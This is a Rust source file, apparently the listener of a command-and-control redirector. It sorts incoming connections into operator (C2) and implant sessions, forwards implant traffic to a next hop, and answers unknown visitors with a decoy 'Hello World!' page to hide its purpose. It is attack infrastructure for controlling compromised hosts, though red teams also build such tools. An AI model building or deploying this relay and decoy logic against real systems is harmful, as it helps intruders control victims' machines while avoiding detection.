use crate::connection::{ConnectionKind, manage_c2_conn, manage_implant_conn, peek};
use crate::models::SessionManager;
use crate::utils::{server_initialization, start_heartbeat};
use anyhow::{Context, Result};
use std::net::SocketAddr;
use tokio::io::AsyncWriteExt;
use tokio::net::{TcpListener, TcpStream};
use tokio::time::Duration;
use tokio::{select, signal};
use tracing::{error, info, warn};

pub async fn start_listener() -> Result<()> {
    let server_cfg = server_initialization();
    let sessions = SessionManager::new();
    start_heartbeat(sessions.clone(), server_cfg.is_last_proxy);

    let listener: TcpListener = TcpListener::bind(&server_cfg.listening_addr)
        .await
        .with_context(|| format!("failed to bind {}", server_cfg.listening_addr))?;

    info!("listening on -> {}", server_cfg.listening_addr);

    'listener: loop {
        select! {
            conn = listener.accept() => {
                let conn: std::io::Result<(TcpStream, SocketAddr)> = conn;
                match conn {
                    Ok((incoming_stream, addr)) => handle_connection(
                        incoming_stream, addr,
                        server_cfg.next_hop_addr.clone(),
                        server_cfg.conn_timeout,
                        server_cfg.is_last_proxy,
                        sessions.clone()

                    ),
                    Err(e) => error!("accept failed: {e}"),
                }
            }

            _ = signal::ctrl_c() => {
                warn!("shutting down proxy server!");
                break 'listener;
            }
        }
    }

    Ok(())
}

fn handle_connection(
    mut incoming_stream: TcpStream,
    addr: SocketAddr,
    next_hop: String,
    conn_timeout: Duration,
    is_last_proxy: bool,
    sessions: SessionManager,
) {
    info!("connection from {addr}");

    tokio::spawn(async move {
        let kind: ConnectionKind = peek(&incoming_stream, is_last_proxy).await;

        match kind {
            ConnectionKind::C2 => {
                info!("{addr}: C2 controller connected");
                if let Err(e) = manage_c2_conn(incoming_stream, sessions, addr).await {
                    error!("{addr}: C2 error: {e:#}");
                }
            }

            ConnectionKind::Implant => {
                info!("{addr}: implant connected");

                if let Err(e) = manage_implant_conn(
                    incoming_stream,
                    is_last_proxy,
                    conn_timeout,
                    &next_hop,
                    addr,
                    sessions,
                )
                .await
                {
                    error!("{addr}: {e:#}");
                    return;
                }
            }

            ConnectionKind::Unknown => {
                warn!("{addr}: rejected (unrecognised connection!)");
                incoming_stream
                    .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nHello World!")
                    .await
                    .ok();
            }
        }
    });
}
